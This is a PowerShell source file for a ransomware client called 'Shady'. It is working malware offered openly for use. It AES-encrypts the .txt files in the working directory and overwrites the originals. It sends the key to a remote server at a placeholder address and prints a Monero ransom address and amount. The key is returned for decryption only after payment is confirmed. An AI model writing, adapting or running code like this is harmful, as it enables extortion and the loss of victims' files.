function Shady-Client {
	<#
	.SYNOPSIS
	Client implementation for Shady ransomware.

	.DESCRIPTION
	Client for Shady ransomware which supports encrypting files and sending the key to a remote server.
	Waiting for payments in Monero (XMR) to arrive, and only then allows decrypting the files.

	.LINK
	https://github.com/sausagenoods/shady

	.PARAMETER Encrypt
	If present the files in the current working directory will be encrypted.
	The encryption key will be stored in cloud and it cannot be retrieved
	until the ransom is paid. This parameter takes no value.

	.PARAMETER Decrypt
	Parameter for decrypting the files in the current working directory.
	The files are only be decrypted if the ransom has been paid.

	.PARAMETER Status
	Parameter for checking payment status. Specifies the payment ID.

	.EXAMPLE
	./Shady-Client -Encrypt

	.EXAMPLE
	./Shady-Client -Decrypt

	.EXAMPLE
	./Shady-Client -Status -Payment e011ebcd-0826-402d-bb0f-cec586f28eef

	.NOTES
	Micro$oft/Powershell is trash. | License: WTFPL
	#>

	[CmdletBinding()]
	
	# Static parameters
	param([switch]$Encrypt, [switch]$Decrypt, [switch]$Status)
	
	# -Payment is a dynamic parameter that exists only when -Status parameter is present.
	DynamicParam {
		if ($Status) {
			$paramAttributes = New-Object -Type System.Management.Automation.ParameterAttribute
			$paramAttributes.Mandatory = $true
			$paramAttributes.HelpMessage = "Enter payment ID:"
			$paramAttributesCollect = New-Object -Type System.Collections.ObjectModel.Collection[System.Attribute]
			$paramAttributesCollect.Add($paramAttributes)
			$payment = New-Object -Type System.Management.Automation.RuntimeDefinedParameter("Payment", [string], $paramAttributesCollect)
			$paramDictionary = New-Object -Type System.Management.Automation.RuntimeDefinedParameterDictionary
			$paramDictionary.Add("Payment", $payment)
			return $paramDictionary
		}
	}
	Begin {
		$PaymentId = $PSBoundParameters['Payment']
	}
	Process {
		if ($Encrypt) {
			EncryptHandler
		}
		if ($Decrypt) {
			DecryptHandler
		}
		if ($Status) {
			PaymentStatus
		}
	}
}

$BaseUrl = 'http://baseurl:1337'

function EncryptHandler {
	Write-Host "Encrypting your directory and sending the key to the Nigerian Queen"
	
	# Encrypt files and return the key.
	$key = EncryptFiles

	$uri = $BaseUrl + '/encrypt'
	$body = @{key=$key}
	$result = Invoke-RestMethod -Uri $uri -Method Post -Body $body
	$result > .shady-cache
	$array = $result.Split(" ")
	$payId = $array[0]
	$address = $array[1]
	$amount = $array[2]
	Write-Host "Pay" $amount "XMR to the addresss:" $address -ForegroundColor Red
	Write-Host "Your payment ID:" $payId
}

function DecryptHandler {
	$data = cat .shady-cache
	$array = $data.Split(" ")
	$payId = $array[0]
	$address = $array[1]
	$amount = $array[2]
	$uri = $BaseUrl + '/decrypt/' + $payId
	$result = Invoke-RestMethod -Uri $uri -Method Get

	if ($result) {
		Write-Host "Payment was received, decrypting your directory"
		DecryptFiles -Key $result
	}
	else {
		Write-Host "You haven't paid yet."
		Write-Host "Pay" $amount "XMR to the addresss:" $address -ForegroundColor Red
		Write-Host "Your payment ID:" $payId
	}
}

Function PaymentStatus {
	$uri = $BaseUrl + '/decrypt/' + $PaymentId
	$result = Invoke-RestMethod -Uri $uri -Method Get
	if ($result) {
		Write-Host "Your payment was received. Run 'Shady-Client -Decrypt' to decrypt your directory."
	}
	else {
		Write-Host "You haven't paid yet."
	}
}

function EncryptFiles {
	# Generate and save AES encryption key.
	$RNG = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
	$AESEncryptionKey = [System.Byte[]]::new(32)
	$RNG.GetBytes($AESEncryptionKey)
	$key = [Convert]::ToBase64String($AESEncryptionKey)

	$InitializationVector = [System.Byte[]]::new(16)
	$RNG.GetBytes($InitializationVector)

	$AESCipher = New-Object System.Security.Cryptography.AesCryptoServiceProvider
	$AESCipher.Key = $AESEncryptionKey
	$AESCipher.IV = $InitializationVector

	$Encryptor = $AESCipher.CreateEncryptor()

	# Encrypt all files with .txt extension
	$files = gci -af | Where Name -match .txt
	foreach ($file in $files) {
		$content = Get-Content $file
		$UnencryptedBytes = [System.Text.Encoding]::UTF8.GetBytes($content)
		$EncryptedBytes = $Encryptor.TransformFinalBlock($UnencryptedBytes, 0, $UnencryptedBytes.Length)

		[byte[]]$FullData = $AESCipher.IV + $EncryptedBytes
		$CipherText = [System.Convert]::ToBase64String($FullData)
		$CipherText > $file
	}
	
	# Clean up the cipher and the key generator
	$AESCipher.Dispose()
	$RNG.Dispose()
	return $key
}

function DecryptFiles {
	param([string]$Key)

	$AESCipher = New-Object System.Security.Cryptography.AesCryptoServiceProvider
	$AESCipher.Key = [System.Convert]::FromBase64String($Key)

	$files = gci -af | Where Name -match .txt
	foreach ($file in $files) {
		$content = Get-Content $file
		$EncryptedBytes = [System.Convert]::FromBase64String($content)
		$AESCipher.IV  = $EncryptedBytes[0..15]

		$Decryptor = $AESCipher.CreateDecryptor();
		$UnencryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 16, $EncryptedBytes.Length - 16)
		[System.Text.Encoding]::UTF8.GetString($UnencryptedBytes) > $file
	}
	$AESCipher.Dispose()
}
